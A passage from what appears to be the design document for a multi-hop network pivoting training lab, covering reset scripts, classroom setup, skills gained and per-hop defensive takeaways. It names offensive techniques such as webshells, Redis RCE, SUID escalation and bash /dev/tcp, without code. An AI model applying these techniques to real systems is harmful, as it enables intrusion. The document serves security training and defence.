`start.sh` generates randomized IPs, writes `.env`, calls `docker compose up -d`.

### 12.2 Full Reset

```bash
./reset.sh
```

Tears down everything including volumes, regenerates flags and IPs, brings everything back up.

### 12.3 Soft Reset

```bash
docker compose down && docker compose up -d
```

Recreates containers (clears player modifications) but preserves flag volume.

### 12.4 Player Prerequisites

A web browser.

### 12.5 Classroom

```bash
for team in alpha bravo charlie; do
  COMPOSE_PROJECT_NAME="pivotlab-${team}" ./start.sh
done
```

---

## 13. Skills Acquired After Completion

| Category | Skills |
|----------|--------|
| **Fundamentals** | Subnetting, routing, TCP vs. UDP, process/service management |
| **Persistence** | SSH keygen, authorized_keys, maintaining access |
| **Tunneling** | SSH -L/-R/-D, proxychains, chisel, socat, multi-hop chains |
| **Enumeration** | Port scanning (TCP and UDP), service ID, decoy recognition |
| **System Inspection** | apk info, /etc/init.d/, rc-status, ss, /proc/net/tcp |
| **Privilege Escalation** | LinPEAS, SUID binary exploitation, GTFOBins |
| **Protocol Abuse** | FTP anon, WebDAV PUT, TFTP unauthenticated access, DNS AXFR, Redis file-write, SMB null sessions |
| **Web Exploitation** | File upload, webshells, HTTP method enumeration |
| **Living Off the Land** | bash /dev/tcp, curl multi-protocol, improvised scanning |
| **OSINT** | Hash identification, public hash databases |

---

## 14. Defensive Takeaways

| Hop | Attack | Defense |
|-----|--------|---------|
| 1 | Open ports, key persistence | Minimize services, audit authorized_keys |
| 2 | SSH tunnel abuse | Restrict AllowTcpForwarding |
| 3 | Anonymous FTP, creds in scripts | Disable anon, secrets management |
| 4 | File upload, SUID privesc | Server-side validation, audit SUID binaries |
| 5 | Activate stopped service | Remove unused packages entirely |
| 6 | TFTP unauthenticated access | Disable TFTP, restrict to management VLAN |
| 7 | DNS zone transfer | Restrict AXFR to authorized secondaries |
| 8 | Redis unauth RCE | requirepass, bind localhost, disable CONFIG |
| 9 | SMB enum, hash lookup | Disable null sessions, strong unique passwords |

---

## 15. Future Enhancements (Roadmap)

**Q4:** HTTPS for scoreboard and shellinabox
**Backlog:**
- Instructor dashboard (aggregate scores across teams)
- Time-based scoring with decay
- MQTT hop (IoT telemetry eavesdropping)
- Git-over-HTTP hop (leaked secrets in commit history)
- ICMP tunneling hop
- Blue team mode (ELK stack, defender perspective)
- Difficulty presets (Easy/Hard modes)
- Achievement badges ("No hints," "Under 2 hours," "Never used ncat")

---

## 16. References

- shellinabox: github.com/shellinabox/shellinabox
- LinPEAS: github.com/peass-ng/PEASS-ng
- GTFOBins: gtfobins.github.io
- SSH tunneling: man ssh (-L, -R, -D)
- Chisel: github.com/jpillora/chisel
- WebDAV: RFC 4918, lighttpd mod_webdav docs
- TFTP: RFC 1350, tftp-hpa documentation
- Redis RCE: "Redis unauthorized access" exploitation pattern
- DNS zone transfers: OWASP testing guides
- SMB: enum4linux, smbclient, smbmap
- CrackStation: crackstation.net
- Alpine packages: pkgs.alpinelinux.org
- OpenRC: wiki.gentoo.org/wiki/OpenRC
- Flask: flask.palletsprojects.com
